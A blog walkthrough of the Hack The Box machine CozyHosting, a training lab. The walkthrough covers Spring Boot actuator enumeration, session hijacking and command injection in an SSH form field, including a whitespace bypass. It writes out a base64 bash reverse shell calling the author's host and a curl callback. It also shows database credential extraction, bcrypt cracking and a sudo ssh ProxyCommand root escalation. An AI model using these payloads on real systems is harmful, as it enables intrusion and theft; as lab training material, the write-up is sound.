---
layout: post
title: Hack The Box Walkthrough - CozyHosting
date: 2023-10-21
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
- Machine
permalink: /2023/10/HTB/CozyHosting
img: 2023/10/CozyHosting/CozyHosting.png
---

In this box, I had to enumerate the endpoints of a Spring Boot application, steal a user session, and inject a command to get a shell. Then I cracked a hash found in a database and exploited a command I could run through sudo.

* Room: CozyHosting
* Difficulty: {{ page.tags[3] }}
* URL: [https://app.hackthebox.com/machines/CozyHosting](https://app.hackthebox.com/machines/CozyHosting)
* Author: [commandercool](https://app.hackthebox.com/users/1005191)

## Enumeration

I started the box by running RustScan to detect open ports.

```bash
$ rustscan -a target -- -A -Pn | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.74.29:22
Open 10.129.74.29:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-22 14:46 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.

...

Completed NSE at 14:46, 0.12s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:46
Completed NSE at 14:46, 0.00s elapsed
Nmap scan report for target (10.129.74.29)
Host is up, received user-set (0.051s latency).
Scanned at 2023-10-22 14:46:07 EDT for 7s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEpNwlByWMKMm7ZgDWRW+WZ9uHc/0Ehct692T5VBBGaWhA71L+yFgM/SqhtUoy0bO8otHbpy3bPBFtmjqQPsbC8=
|   256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHVzF8iMVIHgp9xMX9qxvbaoXVg1xkGLo61jXuUAYq5q
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://cozyhosting.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:46
Completed NSE at 14:46, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:46
Completed NSE at 14:46, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:46
Completed NSE at 14:46, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.74 seconds
```

There were two open ports: 22 (SSH) and 80 (HTTP). I scanned for UDP ports, but did not find anything. The site on port 80 was redirecting to 'cozyhosting.htb', so I added that domain to my hosts file and used `wfuzz` to scan for subdomains. It did not find any.

```bash
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -X POST -t30 --hw 12 -H "Host:FUZZ.cozyhosting.htb" "http://cozyhosting.htb"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://cozyhosting.htb/
Total requests: 648201

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================


Total time: 0
Processed Requests: 648201
Filtered Requests: 648201
Requests/sec.: 0
```

## Website

I opened a browser and looked at the website.

![Website](/assets/images/2023/10/CozyHosting/WebSite.png "Website")

It was a website for a hosting company. The site didn't do much. Only the login page seems to work. I tried to connect using a few sets of simple credentials. I also tried SQL and NoSQL injections. Nothing worked.

I launched Feroxbuster to check for hidden pages.

```bash
$ feroxbuster -u http://cozyhosting.htb -o ferox.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://cozyhosting.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox.txt
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        2w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
401      GET        1l        1w       97c http://cozyhosting.htb/admin
204      GET        0l        0w        0c http://cozyhosting.htb/logout
200      GET       97l      196w     4431c http://cozyhosting.htb/login
200      GET      285l      745w    12706c http://cozyhosting.htb/
200      GET       38l      135w     8621c http://cozyhosting.htb/assets/img/favicon.png
200      GET       29l      131w    11970c http://cozyhosting.htb/assets/img/pricing-free.png
200      GET     2397l     4846w    42231c http://cozyhosting.htb/assets/css/style.css
200      GET       43l      241w    19406c http://cozyhosting.htb/assets/img/pricing-business.png
200      GET      295l      641w     6890c http://cozyhosting.htb/assets/js/main.js
200      GET       38l      135w     8621c http://cozyhosting.htb/assets/img/logo.png
200      GET       83l      453w    36234c http://cozyhosting.htb/assets/img/values-3.png
200      GET        1l      218w    26053c http://cozyhosting.htb/assets/vendor/aos/aos.css
200      GET       79l      519w    40905c http://cozyhosting.htb/assets/img/values-2.png
200      GET       81l      517w    40968c http://cozyhosting.htb/assets/img/hero-img.png
200      GET       73l      470w    37464c http://cozyhosting.htb/assets/img/values-1.png
200      GET       29l      174w    14774c http://cozyhosting.htb/assets/img/pricing-ultimate.png
200      GET        7l     2189w   194901c http://cozyhosting.htb/assets/vendor/bootstrap/css/bootstrap.min.css
200      GET        7l     1222w    80420c http://cozyhosting.htb/assets/vendor/bootstrap/js/bootstrap.bundle.min.js
200      GET        1l      625w    55880c http://cozyhosting.htb/assets/vendor/glightbox/js/glightbox.min.js
500      GET        1l        1w       73c http://cozyhosting.htb/error
200      GET       34l      172w    14934c http://cozyhosting.htb/assets/img/pricing-starter.png
200      GET     2018l    10020w    95609c http://cozyhosting.htb/assets/vendor/bootstrap-icons/bootstrap-icons.css
200      GET       14l     1684w   143706c http://cozyhosting.htb/assets/vendor/swiper/swiper-bundle.min.js
200      GET        1l      313w    14690c http://cozyhosting.htb/assets/vendor/aos/aos.js
200      GET      285l      745w    12706c http://cozyhosting.htb/index
[####################] - 6m    119636/119636  0s      found:25      errors:0
[####################] - 6m    119601/119601  323/s   http://cozyhosting.htb/
```

It did not appear to find anything of interest. At first I ignored the error page. I had seen it a few times already.

![Error Page](/assets/images/2023/10/CozyHosting/ErrorPage.png "Error Page")

After some time, I researched the error page and found it was from [Spring Boot](https://spring.io/projects/spring-boot). I launched Feroxbuster again, trying to find `.java`, `.class`, `.xml`, and `.jar` files. That failed. I found a word list that was built for Spring Boot. I used it in Feroxbuster.

```bash
$ feroxbuster -u http://cozyhosting.htb -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://cozyhosting.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/spring-boot.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        2w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       38l      135w     8621c http://cozyhosting.htb/assets/img/logo.png
200      GET       29l      131w    11970c http://cozyhosting.htb/assets/img/pricing-free.png
200      GET       43l      241w    19406c http://cozyhosting.htb/assets/img/pricing-business.png
200      GET       34l      172w    14934c http://cozyhosting.htb/assets/img/pricing-starter.png
200      GET      295l      641w     6890c http://cozyhosting.htb/assets/js/main.js
200      GET        1l        1w      248c http://cozyhosting.htb/actuator/sessions
200      GET       83l      453w    36234c http://cozyhosting.htb/assets/img/values-3.png
200      GET       81l      517w    40968c http://cozyhosting.htb/assets/img/hero-img.png
200      GET       38l      135w     8621c http://cozyhosting.htb/assets/img/favicon.png
200      GET       73l      470w    37464c http://cozyhosting.htb/assets/img/values-1.png
200      GET       79l      519w    40905c http://cozyhosting.htb/assets/img/values-2.png
200      GET       29l      174w    14774c http://cozyhosting.htb/assets/img/pricing-ultimate.png
200      GET        7l     1222w    80420c http://cozyhosting.htb/assets/vendor/bootstrap/js/bootstrap.bundle.min.js
200      GET       97l      196w     4431c http://cozyhosting.htb/login
200      GET        1l      218w    26053c http://cozyhosting.htb/assets/vendor/aos/aos.css
200      GET        1l      313w    14690c http://cozyhosting.htb/assets/vendor/aos/aos.js
200      GET     2018l    10020w    95609c http://cozyhosting.htb/assets/vendor/bootstrap-icons/bootstrap-icons.css
404      GET        0l        0w        0c http://cozyhosting.htb/actuator/env/language
404      GET        0l        0w        0c http://cozyhosting.htb/actuator/env/spring.jmx.enabled
404      GET        0l        0w        0c http://cozyhosting.htb/actuator/env/hostname
404      GET        0l        0w        0c http://cozyhosting.htb/actuator/env/pwd
404      GET        0l        0w        0c http://cozyhosting.htb/actuator/env/tz
200      GET     2397l     4846w    42231c http://cozyhosting.htb/assets/css/style.css
200      GET        1l      625w    55880c http://cozyhosting.htb/assets/vendor/glightbox/js/glightbox.min.js
200      GET        1l        1w      634c http://cozyhosting.htb/actuator
200      GET        1l       13w      487c http://cozyhosting.htb/actuator/env/lang
200      GET        1l       13w      487c http://cozyhosting.htb/actuator/env/home
200      GET        1l       13w      487c http://cozyhosting.htb/actuator/env/path
200      GET        1l      120w     4957c http://cozyhosting.htb/actuator/env
200      GET        1l        1w       15c http://cozyhosting.htb/actuator/health
200      GET       14l     1684w   143706c http://cozyhosting.htb/assets/vendor/swiper/swiper-bundle.min.js
200      GET        1l      542w   127224c http://cozyhosting.htb/actuator/beans
200      GET        7l     2189w   194901c http://cozyhosting.htb/assets/vendor/bootstrap/css/bootstrap.min.css
200      GET      285l      745w    12706c http://cozyhosting.htb/
200      GET        1l      108w     9938c http://cozyhosting.htb/actuator/mappings
```

This one came up with lots of interesting stuff. The [actuator](https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html) was exposing a few endpoints. It's used to monitor and manage applications. And the 'Sessions' endpoint was exposed. 

![Sessions](/assets/images/2023/10/CozyHosting/Sessions.png "Sessions")

It gave me the session ID of a logged-in user. I changed my 'JSESSIONID' cookie to this value and navigated to the admin page.

![Admin](/assets/images/2023/10/CozyHosting/Admin.png "Admin")

The bottom of the page had a form to include hosts for automatic patching. I tried adding localhost.

![Failed to add host](/assets/images/2023/10/CozyHosting/FailedToAddHost.png "Failed to add host")

It failed, but I thought the values I sent might be used in a shell command. I used Caido to see if I could get it to run arbitrary commands. Especially since the endpoint was called `executessh`.

I tried messing with the hostname. I used a semicolon to try sending another command. I used `$(id)` and ``` `id` ```, it did not appear to execute the code. I also tried making `curl` requests to my machine, I did not get a hit.

I then tried to change the username. I quickly found that it was vulnerable. 

When sending a normal host and username.

```http
POST /executessh HTTP/1.1
Host: cozyhosting.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Origin: http://cozyhosting.htb
Connection: keep-alive
Referer: http://cozyhosting.htb/admin?error=Invalid%20hostname!
Cookie: JSESSIONID=00216F7346FB7223FB7901F1BA4074EB
Upgrade-Insecure-Requests: 1
Content-Length: 33

host=localhost&username=kanderson
```

The error message contained in the redirect URL was about the host key verification.

```http
HTTP/1.1 302 
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 11 Nov 2023 20:12:22 GMT
Content-Length: 0
Location: http://cozyhosting.htb/admin?error=Host key verification failed.
Connection: keep-alive
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
```

When I try sending a semicolon, the error was different.


```
host=localhost&username=kanderson;
```

```
Location: http://cozyhosting.htb/admin?error=ssh: Could not resolve hostname kanderson: Temporary failure in name resolution/bin/bash: line 1: @localhost: command not found
```

I was killing the command. The server was probably running something like this:

```bash
ssh username@host
```

The semicolon was breaking the command. It tried to connect to a server called 'username', but that failed. Then use `@localhost` as another command. Which also failed.

```bash
$ ssh username;@hostname
ssh: Could not resolve hostname username: Temporary failure in name resolution
zsh: command not found: @hostname
```

I tried to use that to fecth a file from my machine.

```
host=localhost&username=kanderson;curl 10.10.14.59#
```

I was not allowed to use whitespaces in the username.

```
Location: http://cozyhosting.htb/admin?error=Username can't contain whitespaces!
```

That was easy to get around. In bash, you can use `${IFS}` as a whitespace.

```bash
$ ls${IFS}-1${IFS}/
app
bin
boot
dev
etc
home
...
```

I used this to try curl again.

```
host=localhost&username=kanderson;curl${IFS}10.10.14.59#
```

The response showed curl had downloaded something.

```
Location: http://cozyhosting.htb/admin?error=ssh: Could not resolve hostname kanderson: Temporary failure in name resolution  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   187  100   187    0     0   2920      0 --:--:-- --:--:-- --:--:--  2968
```

And my web server was hit.

```bash
$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.229.88 - - [11/Nov/2023 15:25:23] "GET / HTTP/1.1" 200 
```

With this, I could build a reverse shell. First I made one in base64 to remove characters that could cause issues in the request.

```bash
$ echo 'bash  -i >& /dev/tcp/10.10.14.59/4444 0>&1  ' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNTkvNDQ0NCAwPiYxICAK
```

Then I started a netcat listener and sent my payload to the server.

```
host=localhost&username=kanderson;echo${IFS}YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNTkvNDQ0NCAwPiYxICAK|base64${IFS}-d|bash;#
```

I had a shell.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.59] from (UNKNOWN) [10.129.229.88] 49488
bash: cannot set terminal process group (1009): Inappropriate ioctl for device
bash: no job control in this shell

app@cozyhosting:/app$ whoami
whoami
app
```

## User josh

I was on the server, but there was not much my user could do. However, I found a jar file. I downloaded the file to my machine and extracted the files it contained.

```bash
$ unzip cloudhosting-0.0.1.jar                                                                                       
Archive:  cloudhosting-0.0.1.jar                                                                                     
   creating: META-INF/                                                                                               
  inflating: META-INF/MANIFEST.MF                                                                                    
   creating: org/                                                                                                    
   creating: org/springframework/                                                                                    
   creating: org/springframework/boot/                                                                               
   creating: org/springframework/boot/loader/

...
```

It contained lots of files. But a grep helped me find some credentials.

```bash
$ grep -R password .                                                             
grep: ./cloudhosting-0.0.1.jar: binary file matches
grep: ./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.ttf: binary file matches
./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.symbol.svg:</symbol><symbol viewBox="0 0 24 24" id="ri-lock-password-fill">
./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.symbol.svg:</symbol><symbol viewBox="0 0 24 24" id="ri-lock-password-line">
./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.css:.ri-lock-password-fill:before { content: "\eecf"; }
./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.css:.ri-lock-password-line:before { content: "\eed0"; }
grep: ./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.eot: binary file matches
./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.less:.ri-lock-password-fill:before { content: "\eecf"; }
./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.less:.ri-lock-password-line:before { content: "\eed0"; }
./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.svg:    <glyph glyph-name="lock-password-fill"
./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.svg:    <glyph glyph-name="lock-password-line"
./BOOT-INF/classes/templates/login.html:                                        <input type="password" name="password" class="form-control" id="yourPassword"
./BOOT-INF/classes/templates/login.html:                                        <div class="invalid-feedback">Please enter your password!</div>
./BOOT-INF/classes/templates/login.html:                                    <p th:if="${param.error}" class="text-center small">Invalid username or password</p>
./BOOT-INF/classes/application.properties:spring.datasource.password=REDACTED
grep: ./BOOT-INF/classes/htb/cloudhosting/secutiry/SecurityConfig.class: binary file matches
grep: ./BOOT-INF/classes/htb/cloudhosting/scheduled/FakeUser.class: binary file matches
grep: ./BOOT-INF/classes/htb/cloudhosting/database/CozyUser.class: binary file matches
grep: ./BOOT-INF/lib/spring-security-crypto-6.0.1.jar: binary file matches


$ cat BOOT-INF/classes/application.properties
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=REDACTED
```

I used those credentials to connect to the database on the server.

```bash
psql -Upostgres  -hlocalhost
Password for user postgres: REDACTED

\l
                                   List of databases
    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges
-------------+----------+----------+-------------+-------------+-----------------------
 cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
 postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
 template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
 template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
(4 rows)


\c cozyhosting
You are now connected to database "cozyhosting" as user "postgres".

\dt
         List of relations
 Schema | Name  | Type  |  Owner
--------+-------+-------+----------
 public | hosts | table | postgres
 public | users | table | postgres
(2 rows)

Select * From users;
   name    |                           password                           | role
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
```

The database contained the password hash for two users. I used hashcat to crack them.

```bash
$ hashcat -a0 -m3200 hash.txt /usr/share/seclists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 7 PRO 5850U with Radeon Graphics, 2865/5794 MB (1024 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/seclists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

Cracking performance lower than expected?

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:REDACTED
```

The hash for the admin user was cracked quickly. There was no user named admin on the box, but I tried the password with josh.

```bash
$ ssh josh@target
josh@target's password:
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-82-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Oct 22 10:53:27 PM UTC 2023

  System load:           0.0
  Usage of /:            59.9% of 5.42GB
  Memory usage:          43%
  Swap usage:            0%
  Processes:             237
  Users logged in:       0
  IPv4 address for eth0: 10.129.74.29
  IPv6 address for eth0: dead:beef::250:56ff:feb0:5d28


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Aug 29 09:03:34 2023 from 10.10.14.41

josh@cozyhosting:~$ cat user.txt
REDACTED
```

## Getting root

Once connected as josh, getting root was easy. I checked if I could run anything with sudo.

```bash
josh@cozyhosting:~$ sudo -l
[sudo] password for josh:
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

I could run `ssh` as root. I checked [GTFOBins](https://gtfobins.github.io/gtfobins/ssh/#sudo) and saw that I could `ProxyCommand` the option to execute another command. The exploit simply launched `sh`.

```bash
josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
# whoami
root

# cat /root/root.txt
REDACTED
```